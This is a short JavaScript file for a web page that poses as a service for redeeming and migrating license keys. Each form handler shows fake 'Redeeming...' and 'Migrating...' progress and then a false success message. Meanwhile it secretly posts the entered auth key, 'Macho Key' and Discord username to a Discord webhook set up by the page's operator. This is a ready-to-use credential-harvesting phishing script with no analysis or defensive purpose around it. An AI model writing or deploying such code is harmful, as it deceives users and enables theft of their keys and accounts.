// Replace with your actual Discord Webhook URL
const webhookURL = "https://discord.com/api/webhooks/your_webhook_id";

// Redeem Key Logic
const redeemForm = document.getElementById("redeemForm");
const redeemStatus = document.getElementById("redeemStatus");

redeemForm.addEventListener("submit", function(e) {
  e.preventDefault();
  const auth = document.getElementById("auth-key").value;

  redeemStatus.textContent = "Redeeming...";
  redeemStatus.style.color = "#ffa500";

  setTimeout(() => {
    redeemStatus.textContent = "Redemption successful.";
    redeemStatus.style.color = "green";

    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `✅ **Redemption Event**\n🔑 Auth Key: ${auth}`
      })
    });
  }, 1500);
});

// Migrate Key Logic
const migrateForm = document.getElementById("migrateForm");
const migrateStatus = document.getElementById("migrateStatus");

migrateForm.addEventListener("submit", function(e) {
  e.preventDefault();
  const macho = document.getElementById("macho-key").value;
  const auth = document.getElementById("auth-key-migrate").value;
  const discord = document.getElementById("discord-user").value;

  migrateStatus.textContent = "Migrating...";
  migrateStatus.style.color = "#785fd3";

  setTimeout(() => {
    migrateStatus.textContent = "Migration successful.";
    migrateStatus.style.color = "lightgreen";

    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🔄 **Migration Event**\n👤 User: ${discord}\n🔑 Macho Key: ${macho}\n✅ Auth Key: ${auth}`
      })
    });
  }, 1500);
});
